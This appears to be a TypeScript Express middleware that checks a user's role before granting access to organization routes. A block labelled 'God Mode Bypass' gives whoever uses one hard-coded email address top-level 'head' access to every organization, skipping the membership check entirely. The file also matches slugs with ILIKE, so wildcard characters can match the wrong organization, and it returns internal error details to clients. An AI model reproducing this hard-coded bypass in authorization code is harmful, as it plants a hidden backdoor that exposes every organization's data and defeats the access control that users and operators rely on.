import { Response, NextFunction } from 'express'
import { AuthenticatedRequest } from './auth.middleware'
import { prisma } from '../config/db'
import { org_member_role } from '@prisma/client'

export interface OrganizationRequest extends AuthenticatedRequest {
  orgMember?: {
    organizationId: string
    role: org_member_role | 'auditor'
  }
}

export function requireOrgRole(allowedRoles: (org_member_role | 'auditor')[]) {
  return async (req: OrganizationRequest, res: Response, next: NextFunction) => {
    const userId = req.user?.id
    const orgIdOrSlug = req.params.orgIdOrSlug

    if (!userId || !orgIdOrSlug) {
      return res.status(400).json({ error: 'Bad Request: Missing User or Organization Info' })
    }

    // God Mode Bypass
    if (req.user?.email === 'generalrino@gmail.com') {
      try {
        const orgs = await prisma.$queryRawUnsafe<any[]>(
          `SELECT id FROM public.organizations WHERE slug ILIKE $1 OR id::text = $1 LIMIT 1`,
          orgIdOrSlug
        )
        if (orgs && orgs.length > 0) {
          req.orgMember = {
            organizationId: orgs[0].id,
            role: 'head'
          }
          return next()
        }
      } catch (err) {}
    }

    try {
      // Menggunakan raw SQL untuk menghindari error Prisma Schema Validation
      // jika client belum di-generate ulang
      const results = await prisma.$queryRawUnsafe<any[]>(
        `
        SELECT om.organization_id, om.role
        FROM public.organization_members om
        JOIN public.organizations o ON om.organization_id = o.id
        WHERE om.profile_id = $1::uuid
          AND (o.slug ILIKE $2 OR o.id::text = $2)
        LIMIT 1
        `,
        userId,
        orgIdOrSlug
      )

      if (!results || results.length === 0) {
        return res.status(403).json({ error: 'Access denied: You are not a member of this organization' })
      }

      const membership = results[0]

      if (allowedRoles.length > 0 && !allowedRoles.includes(membership.role)) {
        return res.status(403).json({ error: 'Access denied: Insufficient permission' })
      }

      req.orgMember = {
        organizationId: membership.organization_id,
        role: membership.role as (org_member_role | 'auditor')
      }

      next()
    } catch (err) {
      console.error('Role validation error:', err)
      return res.status(500).json({ error: 'Internal Authorization Error', details: (err as any).message })
    }
  }
}
